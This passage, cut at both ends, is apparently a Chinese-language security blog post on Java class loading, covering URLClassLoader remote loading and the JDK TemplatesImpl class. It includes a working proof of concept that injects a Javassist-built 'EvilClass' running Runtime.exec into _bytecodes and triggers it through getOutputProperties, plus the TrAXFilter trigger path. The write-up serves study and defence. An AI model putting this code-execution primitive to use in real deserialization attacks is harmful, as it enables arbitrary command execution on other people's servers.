java.security.AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Loader&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Loader <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                    <span class="comment">// 取出 URL 的路径部分</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> url.getFile();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 情况一：URL 以 &quot;/&quot; 结尾，说明是目录风格</span></span><br><span class="line">                    <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 子情况 1.1：本地目录（file 协议）</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">&quot;file&quot;</span>.equals(url.getProtocol())) &#123;</span><br><span class="line">                            <span class="comment">// 用 FileLoader 来处理，从本地文件系统查找 .class</span></span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FileLoader</span>(url);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// 子情况 1.2：远程目录（http/ftp 等）</span></span><br><span class="line">                            <span class="comment">// 用通用 Loader（基于 URLConnection），通过网络请求 .class 文件</span></span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(url);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 情况二：URL 不是目录（没有 &quot;/&quot; 结尾）</span></span><br><span class="line">                        <span class="comment">// 默认当成 JAR 文件（不论是本地 jar 还是远程 jar）</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JarLoader</span>(url, jarHandler, lmap, acc);</span><br><span class="line">                        <span class="comment">// 参数说明：</span></span><br><span class="line">                        <span class="comment">// - jarHandler：处理 jar: 协议的 URLStreamHandler</span></span><br><span class="line">                        <span class="comment">// - lmap：Loader 缓存映射，避免重复创建</span></span><br><span class="line">                        <span class="comment">// - acc：AccessControlContext，保存的安全上下文</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc); <span class="comment">// 使用传入的安全上下文 acc 来执行 PrivilegedAction</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="comment">// 如果 PrivilegedAction 抛出异常，这里解包并抛出原始 IOException</span></span><br><span class="line">        <span class="keyword">throw</span> (IOException)pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>核心就是：<strong>先判断“目录风格”，再看协议，最后兜底为 JAR 文件</strong>。</p>
<ul>
<li><strong>目录风格</strong>（<code>url.getFile().endsWith(&quot;/&quot;)</code>）<ul>
<li><code>file:</code> → <strong>FileLoader</strong><br> 直接拼接路径 <code>/path/to/classes/com/example/Foo.class</code></li>
<li>非 <code>file:</code>（http&#x2F;ftp 等）→ <strong>Loader</strong><br> 用 <code>URLConnection</code> 拼出 <code>http://host/classes/com/example/Foo.class</code>，直接下载字节</li>
</ul>
</li>
<li><strong>文件风格</strong>（没有 <code>/</code> 结尾 → 当成 JAR）<ul>
<li><strong>JarLoader</strong><br> 无论是 <code>file:/lib/foo.jar</code> 还是 <code>http://host/foo.jar</code>，都交给 <code>JarLoader</code><br> 内部会通过 <code>JarFile</code>（本地）或 <code>JarURLConnection</code>（远程）读取 class entry。</li>
</ul>
</li>
</ul>
<p>使用 <code>Loader</code> 寻找类是非 file 协议的情况下，最常见的就是 <code>http</code> 协议，此时会用到 <code>URLClassLoader</code> 。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteJarDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">jar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://example.com/path/to/your/jarfile.jar&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123; jar &#125;)) &#123;</span><br><span class="line">            Class&lt;?&gt; cls = loader.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>); <span class="comment">// 完全限定名</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> cls.getDeclaredConstructor().newInstance();</span><br><span class="line">            cls.getMethod(<span class="string">&quot;someMethod&quot;</span>).invoke(instance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果是远程加载 <code>.class</code> 文件，路径为 <code>http://example.com/path/to/your/classes/</code>，然后 <code>loadClass</code> 传入的是 <code>.class</code> 文件的文件名（没有后缀）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteDirDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://example.com/path/to/your/classes/&quot;</span>); <span class="comment">// 结尾必须是 /</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123; dir &#125;)) &#123;</span><br><span class="line">            <span class="comment">// 会发起：GET http://example.com/path/to/your/classes/com/example/MyClass.class</span></span><br><span class="line">            Class&lt;?&gt; cls = loader.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>); <span class="comment">// 完全限定名</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> cls.getDeclaredConstructor().newInstance();</span><br><span class="line">            cls.getMethod(<span class="string">&quot;someMethod&quot;</span>).invoke(instance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 是 JDK 内置 Xalan XSLT 引擎中的一个类，实现了 <code>javax.xml.transform.Templates</code> 接口。<br>它的设计目的是：<strong>封装一个已编译好的 XSLT 样式表</strong>，并能基于内部保存的字节码反复创建 <code>Transformer</code> 实例，从而对 XML 文档执行转换。</p>
<p>在安全研究中，这个类之所以重要，是因为它内部维护了<strong>可直接加载和实例化的字节码数组</strong>。攻击者如果能够控制这些字段，就能在调用转换逻辑时触发任意字节码的加载与执行。<code>TemplatesImpl</code> 类内部有几个关键的字段和方法：</p>
<ul>
<li><strong><code>private String _name</code></strong> ：样式表的名称。</li>
<li><strong><code>private byte[][] _bytecodes</code></strong> ：存储了经过编译的字节码的数组，这些字节码会在运行时被加载并执行。</li>
<li><strong><code>private transient TransformerFactoryImpl _tfactory</code></strong> ：<code>TransformerFactory</code> 的引用，用于生成 <code>Transformer</code> 对象。</li>
<li><strong><code>private transient Class[] _class</code></strong> ：用于缓存 <code>_bytecodes</code> 被真正加载为 <code>Class</code> 对象之后的结果。</li>
</ul>
<p>这些字段中的 <code>_bytecodes</code> 和 <code>_class</code> 是特别重要的，因为它们直接涉及到字节码的加载和类的定义。</p>
<p><code>TemplatesImpl</code> 定义了一个内部静态类 <code>TransletClassLoader</code>（继承自 <code>ClassLoader</code>），专门用来<strong>加载 XSLT 编译生成的 Java 类（translet）</strong>。这些类是在 XSLT 编译阶段动态产出的，用于执行特定的转换逻辑。</p>
<p>由于 <code>ClassLoader#defineClass(String, byte[], int, int)</code> 是 <strong>protected</strong> 方法，而 <code>TemplatesImpl</code> 本身既<strong>不在</strong> <code>java.lang</code> 包里、也<strong>不是</strong> <code>ClassLoader</code> 的子类，<strong>不能</strong>直接调用该受保护方法。</p>
<p>为此，<code>TemplatesImpl</code> 在它的内部定义了一个子类 <code>TransletClassLoader</code>，并在这个子类里额外提供了一个<strong>新的便捷方法</strong> <code>defineClass(byte[])</code>：该方法签名与父类受保护方法不同，<strong>不是重写（override）</strong>，而是<strong>新增的同名便捷包装（wrapper）</strong>，内部再去调用父类的受保护 <code>defineClass(...)</code> 完成实际的类定义。</p>
<blockquote>
<p>Java 中默情况下，如果一个方法没有显式声明作用域，其作用域为 <strong>包私有（default）</strong>。这意味着该方法只能在同一包内被访问，其他包的类无法访问该方法。</p>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 便捷包装：并非覆盖父类方法（签名不同），可见性为“包内可见”</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="comment">// 最终仍调用的是父类受保护的 defineClass(String, byte[], int, int)</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>TransletClassLoader#defineClass(byte[])</code> 只是为 <strong>同包内</strong> 的 <code>TemplatesImpl</code> 提供了一个<strong>调用父类受保护 <code>defineClass(...)</code> 的“跳板”</strong>。它既<strong>没有</strong>改变父类方法的可见性，也<strong>没有</strong>把能力公开为 <code>public</code>。因此：</p>
<ul>
<li><strong>不是把父类的 protected 方法“降级”为 default</strong><br> 这里的 <code>defineClass(byte[])</code> 是<strong>新增</strong>的方法（签名不同），并没有改变父类受保护方法的可见性。父类的 <code>defineClass(String, byte[], int, int)</code> 依然是 <strong>protected</strong>。</li>
<li><strong>包内可见 ≠ 任意类可见</strong><br> 这个便捷方法<strong>没有显式修饰符</strong>，因此是<strong>包内可见（package‑private）</strong>。这意味着只有<strong>同一包</strong>（<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>）内的代码可以调用它；<code>TemplatesImpl</code> 与该内部类处于同一包，<strong>可以</strong>调用；其他包的代码则<strong>不能</strong>直接调用。</li>
</ul>

    </div>
  </div>

<p>例如下面这段代码，我们通过调用 <code>TemplatesImpl</code> 的 <code>getOutputProperties</code> 方法成功加载了设置在 <code>_bytecodes</code> 字段中的字节码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] classByteCode = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classByteCode&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_transletIndex&quot;, 0);</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_auxClasses&quot;, new HashMap&lt;String, Object&gt;());</span></span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:507)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>也就是说如果我们只要调用到上述调用栈中任意一个函数就可以实现任意字节码加载。</p>
<p>例如 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 的构造函数就可以调用参数 <code>templates</code> 的 <code>newTransformer</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">// 👈</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果我们构造的利用链能调用 <code>TrAXFilter</code> 的构造函数且参数可控就可以实现任意字节码加载：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:64)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>整个调用过程大致如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">  └─→ newTransformer()</span><br><span class="line">       └─→ getTransletInstance()</span><br><span class="line">            ├─[前置条件] _name != <span class="literal">null</span>，否则直接返回</span><br><span class="line">            ├─ 若 _class == <span class="literal">null</span> → defineTransletClasses()</span><br><span class="line">            │     ├─ 构造 TransletClassLoader（doPrivileged）</span><br><span class="line">            │     ├─ 遍历 _bytecodes：</span><br><span class="line">            │     │     └─ loader.defineClass(<span class="type">byte</span>[])  <span class="comment">// 包可见便捷方法，内部调父类 protected defineClass(...)</span></span><br><span class="line">            │     ├─ 以父类是否为 AbstractTranslet 识别“主类”，记录 _transletIndex</span><br><span class="line">            │     └─ 异常处理（ClassFormatError/LinkageError → 包装为 TransformerConfigurationException）</span><br><span class="line">            ├─ translet = (AbstractTranslet) _class[_transletIndex].newInstance()</span><br><span class="line">            │     <span class="comment">// 此时触发：类初始化(&lt;clinit&gt;) → 构造器(&lt;init&gt;) 的顺序</span></span><br><span class="line">            ├─ translet.postInitialization()/setTemplates(...) 等收尾</span><br><span class="line">            └─ 返回 translet</span><br><span class="line">       └─ 用 translet 构造 TransformerImpl</span><br><span class="line">  └─ TransformerImpl.getOutputProperties()</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>getOutputProperties</code> 函数中会调用 <code>newTransformer</code> 函数，然后在 <code>newTransformer</code> 函数中调用 <code>getTransletInstance</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现 JAXP 的 Templates.getOutputProperties()。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义：</span></span><br><span class="line"><span class="comment"> *   返回与当前模板（TemplatesImpl）关联的“标准化输出属性”集合</span></span><br><span class="line"><span class="comment"> *   （例如 method、encoding、media-type、indent 等）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 实现要点：</span></span><br><span class="line"><span class="comment"> *   - XSLTC 的实现通过先创建一个 Transformer，再向其询问合并后的输出属性。</span></span><br><span class="line"><span class="comment"> *   - 在第一次调用的路径上，这个过程可能会触发 translet 的“惰性初始化”：</span></span><br><span class="line"><span class="comment"> *     newTransformer() → getTransletInstance() → defineTransletClasses()。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 并发：</span></span><br><span class="line"><span class="comment"> *   - 方法被声明为 synchronized（与 newTransformer 同步），</span></span><br><span class="line"><span class="comment"> *     以保证对内部缓存（_class/_auxClasses/_transletIndex 等）的惰性初始化是互斥和可见的。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *   - 成功返回一个 Properties 实例（是否为副本取决于具体实现，调用方不应依赖可变共享）。</span></span><br><span class="line"><span class="comment"> *   - 若创建 Transformer 过程出错，捕获 TransformerConfigurationException 并返回 null（实现约定）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 输出属性；出错时返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 📌 通过创建一个 Transformer 来获得其合并后的输出属性</span></span><br><span class="line">        <span class="comment">//    （内部可能触发首次的类定义与实例化，但不会执行实际转换）</span></span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="comment">// 出现配置/初始化错误时，按实现约定返回 null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现 JAXP 的 Templates.newTransformer()。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义：</span></span><br><span class="line"><span class="comment"> *   为当前模板创建并返回一个“新的、独立的” Transformer 实例。</span></span><br><span class="line"><span class="comment"> *   （JAXP 约定：Templates 是可复用/线程安全的工厂，Transformer 本身非线程安全，</span></span><br><span class="line"><span class="comment"> *     因此每次调用都应返回一个新的实例。）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 实现要点：</span></span><br><span class="line"><span class="comment"> *   - 通过 getTransletInstance() 获取主 translet 的新实例；</span></span><br><span class="line"><span class="comment"> *     若是首次使用，内部会先将 _bytecodes 定义为 Class[] 并确定主类索引。</span></span><br><span class="line"><span class="comment"> *   - 将 translet、输出属性、缩进设置与工厂引用传入具体实现 TransformerImpl，</span></span><br><span class="line"><span class="comment"> *     其余初始化细节在 TransformerImpl 内部完成。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 并发：</span></span><br><span class="line"><span class="comment"> *   - 方法为 synchronized，确保与 defineTransletClasses()/getTransletInstance()</span></span><br><span class="line"><span class="comment"> *     的惰性初始化互斥，避免并发下的重复定义或可见性问题。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 异常：</span></span><br><span class="line"><span class="comment"> *   - 若 translet 定义/链接/实例化或 Transformer 构造过程出现问题，</span></span><br><span class="line"><span class="comment"> *     统一抛出 TransformerConfigurationException。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> TransformerConfigurationException 创建 Transformer 过程中发生错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 新创建的 Transformer 实例</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于“主 translet 实例 + 输出属性 + 缩进设置 + 工厂”构造具体实现</span></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(</span><br><span class="line">        getTransletInstance(),   <span class="comment">// 📌 